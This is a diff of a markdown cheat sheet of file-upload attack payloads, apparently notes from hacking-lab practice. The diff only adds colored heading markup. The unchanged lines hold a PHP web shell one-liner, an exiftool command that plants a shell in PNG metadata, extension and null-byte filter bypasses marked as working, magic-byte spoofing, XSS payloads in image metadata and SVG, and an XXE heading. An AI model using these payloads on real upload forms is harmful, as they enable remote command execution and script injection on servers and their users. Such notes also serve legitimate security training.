@@ -7,10 +7,10 @@
     - 2. exiftool "-comment<=shell.php" malicious.png 
     - 3. strings malicious.png | grep system
 
-##### Paylaods
+##### <span style="color:#FFB86C">Paylaods</span>
 https://github.com/KathanP19/HowToHunt/blob/master/File_Upload/file_upload.md
 
-# Blacklist Filters
+# <span style="color:#FF5555">Blacklist Filters</span>
 - paylaods
 ```bash
 .phtml
@@ -25,7 +25,7 @@ https://github.com/KathanP19/HowToHunt/blob/master/File_Upload/file_upload.md
 <?php system($_REQUEST["cmd"]); ?>
 ```
 
-# Whitelist Filters
+# <span style="color:#FF5555">Whitelist Filters</span>
 
 - `shell.phar;.jpg` (worked)
 - `shell.jpg.php` ✅ (may pass weak whitelist regex)
@@ -33,7 +33,7 @@ https://github.com/KathanP19/HowToHunt/blob/master/File_Upload/file_upload.md
 - `shell.php%00.jpg` ✅ (bypasses old PHP 5.x or vulnerable setups)
 - `shell.phtml` ✅ (works if `.phtml` is not blacklisted)
 - `shell.phar` ✅ (supported by some Apache configs)
-#### Character Injection
+#### <span style="color:#FFB86C">Character Injection</span>
 - `%20`
 - `%0a`
 - `%00`
@@ -120,7 +120,7 @@ shell.jpg.phps:
 ```
 
 
-# # Type Filters
+# <span style="color:#FF5555">Type Filters</span>
 
 **Server uses `mime_content_type()`** or similar, so we must **fake magic bytes** (e.g. start the file with `GIF89a` or `GIF8`).
 
@@ -137,9 +137,9 @@ GIF8
 - `shell.gif.phar` (worked)
 - `shell.php.gif`
 
-# Limited File Uploads (svg)
+# <span style="color:#FF5555">Limited File Uploads (svg)</span>
 
-## XSS (Cross Site Scripting)
+## <span style="color:#8BE9FD">XSS (Cross Site Scripting)</span>
 
 ```bash
 exiftool -Comment=' "><img src=1 onerror=alert(window.origin)>' HTB.jpg
@@ -153,7 +153,7 @@ exiftool -Comment=' "><img src=1 onerror=alert(window.origin)>' HTB.jpg
     <script type="text/javascript">alert(window.origin);</script>
 </svg>
 ```
-### XXE ( XML external entity (XXE) injection)
+### <span style="color:#50FA7B">XXE ( XML external entity (XXE) injection)</span>
 
 
 ```xml
